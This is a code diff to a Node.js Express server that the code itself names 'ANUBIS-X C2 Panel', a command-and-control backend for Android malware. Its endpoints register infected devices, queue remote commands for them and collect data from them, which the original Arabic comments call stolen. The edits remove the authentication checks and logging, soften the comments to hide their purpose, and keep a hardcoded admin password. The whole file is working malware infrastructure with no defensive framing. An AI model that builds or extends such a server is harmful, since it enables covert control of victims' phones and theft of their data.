@@ -6,18 +6,14 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ===== CORS =====
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    if (req.method === 'OPTIONS') {
-        return res.sendStatus(200);
-    }
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    if (req.method === 'OPTIONS') return res.sendStatus(200);
     next();
 });
 
-// ===== الإعدادات =====
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 app.use(session({
@@ -27,45 +23,51 @@ app.use(session({
     cookie: { secure: false, maxAge: 3600000 }
 }));
 
-// ===== التخزين المؤقت =====
+// ===== التخزين =====
 let devices = [];
 let commands = [];
 let capturedData = [];
 
+// ===== تنظيف الأجهزة الميتة كل 10 ثواني =====
+setInterval(() => {
+    const now = Date.now();
+    devices = devices.filter(device => {
+        const lastSeen = new Date(device.last_seen).getTime();
+        return (now - lastSeen) < 60000; // ← يختفي بعد 60 ثانية بدون اتصال
+    });
+}, 10000);
+
 // ===== تسجيل الدخول =====
 app.post('/api/login', (req, res) => {
-    console.log('Login attempt:', req.body);
-    const { username, password } = req.body;
+    let { username, password } = req.body;
+    username = (username || '').trim();
+    password = (password || '').trim();
     
     if (username === 'admin' && password === 'anubis2024') {
         req.session.logged_in = true;
-        console.log('✅ Login successful');
         res.json({ success: true });
     } else {
-        console.log('❌ Login failed');
         res.json({ success: false });
     }
 });
 
-// ===== التحقق من الدخول =====
+// ===== التحقق =====
 app.get('/api/check-auth', (req, res) => {
     res.json({ logged_in: req.session.logged_in || false });
 });
 
-// ===== تسجيل الخروج =====
+// ===== خروج =====
 app.post('/api/logout', (req, res) => {
     req.session.destroy();
     res.json({ success: true });
 });
 
-// ===== تسجيل جهاز جديد =====
+// ===== تسجيل جهاز =====
 app.post('/api/register-device', (req, res) => {
     const device = {
         id: req.body.device_id || 'unknown',
         model: req.body.model || 'Unknown',
-        manufacturer: req.body.manufacturer || 'Unknown',
         android_version: req.body.android_version || 'N/A',
-        sdk_version: req.body.sdk_version || 0,
         last_seen: new Date().toISOString(),
         online: true
     };
@@ -73,10 +75,8 @@ app.post('/api/register-device', (req, res) => {
     const index = devices.findIndex(d => d.id === device.id);
     if (index !== -1) {
         devices[index] = { ...devices[index], ...device };
-        console.log('🔄 Device updated:', device.model);
     } else {
         devices.push(device);
-        console.log('📱 New device registered:', device.model);
     }
     
     res.json({ success: true });
@@ -84,94 +84,64 @@ app.post('/api/register-device', (req, res) => {
 
 // ===== جلب الأجهزة =====
 app.get('/api/devices', (req, res) => {
-    if (!req.session.logged_in) {
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
+    // تحديث حالة الأجهزة
+    const now = Date.now();
+    devices = devices.filter(device => {
+        const lastSeen = new Date(device.last_seen).getTime();
+        device.online = (now - lastSeen) < 60000;
+        return device.online;
+    });
+    
     res.json({ devices });
 });
 
 // ===== إرسال أمر =====
 app.post('/api/commands', (req, res) => {
-    if (!req.session.logged_in) {
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
     const command = {
         id: Date.now(),
         device_id: req.body.device_id,
         command: req.body.command,
-        status: 'pending',
-        created_at: new Date().toISOString()
+        status: 'pending'
     };
-    
     commands.push(command);
-    console.log('🎮 Command sent:', command.command, '→', command.device_id);
-    res.json({ success: true, command_id: command.id });
+    res.json({ success: true });
 });
 
-// ===== جلب الأوامر لجهاز معين =====
+// ===== جلب أوامر =====
 app.get('/api/get-commands/:deviceId', (req, res) => {
     const deviceCommands = commands.filter(c => 
         c.device_id === req.params.deviceId && c.status === 'pending'
     );
-    
     deviceCommands.forEach(c => c.status = 'executed');
-    
     res.json({ commands: deviceCommands });
 });
 
-// ===== إرسال بيانات مسروقة =====
+// ===== إرسال بيانات =====
 app.post('/api/send-data', (req, res) => {
-    const data = req.body.data || 'No data';
-    const deviceId = req.body.device_id || 'unknown';
-    
     capturedData.push({
-        device_id: deviceId,
-        data: data,
+        device_id: req.body.device_id,
+        data: req.body.data,
         timestamp: new Date().toISOString()
     });
-    
-    console.log('📊 Data from', deviceId, ':', data.substring(0, 100));
     res.json({ success: true });
 });
 
-// ===== جلب البيانات المسروقة =====
+// ===== جلب بيانات =====
 app.get('/api/data', (req, res) => {
-    if (!req.session.logged_in) {
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
     const logs = capturedData.map(item => 
-        `[${item.timestamp}] [${item.device_id}] ${item.data}`
+        `[${item.timestamp}] ${item.data}`
     );
-    
     res.json({ logs });
 });
 
-// ===== الإحصائيات =====
-app.get('/api/stats', (req, res) => {
-    res.json({
-        devices: devices.length,
-        commands: commands.length,
-        data: capturedData.length
-    });
-});
-
-// ===== الصفحة الرئيسية =====
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// ===== لوحة التحكم =====
 app.get('/dashboard', (req, res) => {
-    if (!req.session.logged_in) {
-        return res.redirect('/');
-    }
     res.sendFile(path.join(__dirname, 'dashboard.html'));
 });
 
-// ===== تشغيل السيرفر =====
 app.listen(PORT, () => {
-    console.log('⚡ ANUBIS-X C2 Panel');
-    console.log(`🌐 Running on port ${PORT}`);
+    console.log(`⚡ Running on port ${PORT}`);
 });
